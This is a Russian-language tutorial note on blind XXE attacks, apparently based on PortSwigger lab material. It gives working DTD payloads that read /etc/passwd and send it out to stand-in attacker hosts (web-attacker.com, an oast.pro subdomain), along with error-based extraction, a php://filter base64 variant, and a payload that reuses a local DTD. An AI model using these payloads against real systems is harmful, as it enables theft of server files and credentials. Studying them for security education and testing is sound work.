Уязвимости Blind XXE возникают, когда приложение уязвимо для внедрения XXE, но не возвращает значения каких-либо определенных внешних сущностей в своих ответах. Это означает, что прямое извлечение файлов на стороне сервера невозможно, и поэтому уязвимости Blind XXE, как правило, сложнее эксплуатировать, чем обычные уязвимости XXE.

Существует два основных способа обнаружения и эксплуатации уязвимостей слепого XXE:
- Можно инициировать внеполосные сетевые взаимодействия, иногда извлекая конфиденциальные данные из данных взаимодействия.
- Инициировать ошибки анализа XML таким образом, чтобы сообщения об ошибках содержали конфиденциальные данные.

# Обнаружение слепого XXE с использованием внеполосных (OAST) методов

Часто можно обнаружить слепой XXE, используя ту же технику, что и для [атак XXE SSRF](https://portswigger.net/web-security/xxe#exploiting-xxe-to-perform-ssrf-attacks) , но запуская внеполосное сетевое взаимодействие с системой, которую мы контролируем. Например, можно определить внешний объект следующим образом:

```
<!DOCTYPE foo [ 
	<!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> 
]>
```

#### Лаба
[[Лабораторная работа слепой XXE с внеполосным взаимодействием]]


Иногда атаки XXE с использованием обычных сущностей блокируются из-за некоторой проверки ввода приложением или некоторого усиления используемого парсера XML. В этой ситуации можно использовать сущности параметров XML вместо них. Сущности параметров XML — это особый вид сущности XML, на которую можно ссылаться только в другом месте в пределах DTD. 

Объявление сущности параметра XML включает символ процента перед именем сущности:
`<!ENTITY % myparameterentity "my parameter entity value" >`

Для ссылки на параметрические сущности используется символ процента вместо обычного амперсанда:
`%myparameterentity;`

Это означает, что можно проверить наличие слепого XXE, используя внеполосное обнаружение с помощью сущностей параметров XML следующим образом:

```
<!DOCTYPE foo [ 
	<!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> 
	%xxe; 
]>
```

Эта полезная нагрузка XXE объявляет сущность параметра XML, которая называется `xxe`, а затем использует сущность в DTD. Это вызовет поиск DNS и HTTP-запрос к домену злоумышленника, подтверждая, что атака была успешной.

#### Лаба
[[Лаборатория слепой XXE с внеполосной взаимодействием через объекты XML-параметры]]


# Использование слепого XXE для извлечения данных за пределы канала

Пример вредоносного DTD для извлечения содержимого `/etc/passwd`файла выглядит следующим образом:

```
<!ENTITY % file SYSTEM "file:///etc/passwd"> 
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>"> 

%eval; 
%exfiltrate;
```

Данный DTD выполняет следующие шаги:
- Определяет параметрическую сущность XML с именем `file`, содержащую содержимое файла `/etc/passwd`.
- Определяет параметр XML-сущности, называемый `eval`, содержащий динамическое объявление другой параметр XML-сущности, называемой `exfiltrate`. `exfiltrate`Сущность будет оценена путем выполнения HTTP-запроса к веб-серверу злоумышленника, содержащего значение сущности `file`в строке запроса URL.
- Использует сущность, что приводит к выполнению `eval`динамического объявления сущности .`exfiltrate`
- Использует `exfiltrate`сущность, так что ее значение оценивается путем запроса указанного URL.

#### Примечание
Этот метод может не работать с некоторым содержимым файла, включая символы новой строки, содержащиеся в `/etc/passwd`файле. Это связано с тем, что некоторые парсеры XML извлекают URL во внешнем определении сущности с помощью API, который проверяет символы, разрешенные для использования в URL. В этой ситуации может быть возможно использовать протокол FTP вместо HTTP.

#### Лаба
[[Лабораторная работа Эксплуатация слепого XXE для извлечения данных с использованием вредоносного внешнего DTD]]


# Использование слепого XXE для извлечения данных через сообщения об ошибках

Альтернативный подход к эксплуатации слепого XXE заключается в запуске ошибки анализа XML, где сообщение об ошибке содержит конфиденциальные данные, которые мы хотим получить. Это будет эффективно, если приложение вернет результирующее сообщение об ошибке в своем ответе.

Можно вызвать сообщение об ошибке анализа XML, содержащее содержимое файла, `/etc/passwd`используя вредоносный внешний DTD следующим образом:

```
<!ENTITY % file SYSTEM "file:///etc/passwd"> 
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>"> %eval; 
%error;
```

**Данный DTD выполняет следующие шаги:**

- Определяет параметрическую сущность XML с именем `file`, содержащую содержимое файла `/etc/passwd`.

- Определяет параметр XML-сущности, называемую `eval`, содержащую динамическое объявление другой параметр XML-сущности, называемой `error`. `error`Сущность будет оценена путем загрузки несуществующего файла, имя которого содержит значение `file`сущности.

- Использует сущность, что приводит к выполнению `eval`динамического объявления сущности .`error`

- Использует `error`сущность, так что ее значение оценивается путем попытки загрузить несуществующий файл, что приводит к сообщению об ошибке, содержащему имя несуществующего файла, которое является содержимым файла `/etc/passwd`.

Вызов вредоносного внешнего DTD приведет к появлению сообщения об ошибке, подобного следующему:
`java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin ...`

#### Лаба
[[Лаборатория эксплуатируя Blind XXE для получения данных с помощью сообщений об ошибках]]

### Сущности параметров XML с CDATA
```
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % start "<![CDATA[">
  <!ENTITY % end "]]>">
  <!ENTITY % wrapper "<!ENTITY &#x25; send SYSTEM 'https://YOUR-SUBDOMAIN.oast.pro/?data=%start;%file;%end;'>">
  %wrapper;
]>
<root>%send;</root>
```
**Объяснение payload**
#### Что происходит?
1. **Чтение файла**:
    - Сущность `%file` читает содержимое файла `/etc/passwd`.

2. **Экранирование данных**:    
    - Сущности `%start` и `%end` добавляют `<![CDATA[` и `]]>` вокруг данных файла. Это экранирует спецсимволы, чтобы они не нарушили структуру XML.

3. **Отправка данных**:    
    - Сущность `%wrapper` создает `%send`, которая отправляет данные на сервер злоумышленника в виде:
	  `https://YOUR-SUBDOMAIN.oast.pro/?data=<![CDATA[содержимое_файла]]>`

4. **Преимущества CDATA**:
    - Если файл содержит символы вроде `<`, `>`, `&`, они не вызовут ошибок парсера.
    - Данные передаются в чистом виде, без искажений.

#### Почему важна CDATA?

- **Спецсимволы**: Без CDATA содержимое файла (например, `/etc/passwd`) может содержать символы, которые нарушат структуру XML или URL.
    
- **Надежность**: CDATA гарантирует, что данные будут переданы корректно, даже если они содержат спецсимволы.
    

#### Альтернатива: Base64

Если CDATA не подходит (например, из-за ограничений парсера), можно использовать Base64-кодирование:
`<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">`

- Данные файла будут закодированы в Base64, что также предотвращает проблемы с спецсимволами.


# Использование слепого XXE путем повторного использования локального DTD

Это слепая уязвимость XXE, когда блокируются внеполосные взаимодействия. Мы не можем извлечь данные через внеполосное соединение, и не можем загрузить внешний DTD с удаленного сервера.

Парсер настроен так что любые внешние соединения блокируются но если он использует гибрид внутренних и внешних деклараций DTD, то внутренний DTD может переопределять сущности, объявленные во внешнем DTD. Когда это происходит, ограничение на использование сущности параметра XML в определении другой сущности параметра ослабевает.

Атака заключается в поиске внешнего файл DTD, который является локальным для сервера приложений. Атака заключается в вызове файла DTD, который существует в локальной файловой системе, и повторном использовании его для переопределения существующей сущности в нём таким образом, что это вызывает ошибку синтаксического анализа, содержащую конфиденциальные данные.

### Пример 
В файловой системе сервера по адресу есть файл DTD `/usr/local/app/schema.dtd`, и этот файл DTD определяет сущность с именем `custom_entity`. Злоумышленник может вызвать сообщение об ошибке анализа XML, содержащее содержимое файла `/etc/passwd`, отправив гибридный DTD, например, следующий:

```
<!DOCTYPE foo [ 
	<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd"> 
	<!ENTITY % custom_entity '
		<!ENTITY &#x25; file SYSTEM "file:///etc/passwd"> 
		 <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
		  &#x25;eval; 
		  &#x25;error; 
	'> 
	  
	  %local_dtd; 
]>
```

Данный DTD выполняет следующие шаги:

**1. Загрузка локального DTD-файла**
	`<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">`
- Загружает локальный DTD-файл с сервера по пути `/usr/local/app/schema.dtd`.
- Этот файл содержит сущности, которые можно переопределить для выполнения вредоносных действий.

 **2. Переопределение сущности `custom_entity`**
```
<!ENTITY % custom_entity '
  <!ENTITY &#x25; file SYSTEM "file:///etc/passwd"> 
  <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
  &#x25;eval; 
  &#x25;error; 
'>
```
- Переопределяет сущность `custom_entity`, которая уже существует в локальном DTD-файле (`schema.dtd`).
    - Внутри переопределённой сущности:
        - `<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">` — создаёт сущность `%file;`, которая загружает содержимое файла `/etc/passwd`.
        
        - `<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">` — создаёт сущность `%eval;`, которая пытается загрузить несуществующий файл (`file:///nonexistent/`) с содержимым `%file;`.
        
        - `&#x25;eval;` и `&#x25;error;` — выполняют сущности `%eval;` и `%error;`.
        
	`&#x26;#x25;`  
	   - Это двойное экранирование:  
	     - &#x26; — это символ &.  
	     - &#x25; — это символ %.  
	   - В итоге &#x26;#x25; превращается в &%, где & — это начало XML-сущности, а % — символ для параметрических сущностей.
	 `&#x27;`  
	   - Это HTML/XML-код для символа ' (апостроф).

- Это вызывает ошибку, которая содержит содержимое файла `/etc/passwd`.

**3. Использование локального DTD**
`%local_dtd;`

- Загружает и интерпретирует локальный DTD-файл (`schema.dtd`), включая переопределённую сущность `custom_entity`.

## Поиск существующего файла DTD для повторного использования

Поскольку эта атака XXE подразумевает повторное использование существующего DTD в файловой системе сервера, ключевым требованием является поиск подходящего файла.

Можно легко перечислить локальные файлы DTD, просто попытавшись загрузить их из внутреннего DTD.

В системе Linux, использующие среду рабочего стола GNOME, часто имеют файл DTD по адресу `/usr/share/yelp/dtd/docbookx.dtd`. 

Можно проверить, присутствует ли этот файл, отправив следующую полезную нагрузку XXE, которая вызовет ошибку, если файл отсутствует:
```
<!DOCTYPE foo [ 
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"> %local_dtd; 
]>
```

После того, как мы протестируем список общих файлов DTD, чтобы найти файл, который присутствует, нам нужно получить копию файла и просмотреть ее, чтобы найти сущность, которую можно переопределить. Поскольку **многие общие системы, которые включают файлы DTD, имеют открытый исходный код**, то обычно можно быстро получить копию файлов с помощью поиска в Интернете.

#### Лаба
[[Лаборатория эксплуатация XXE для получения данных путем переопределения локального DTD]]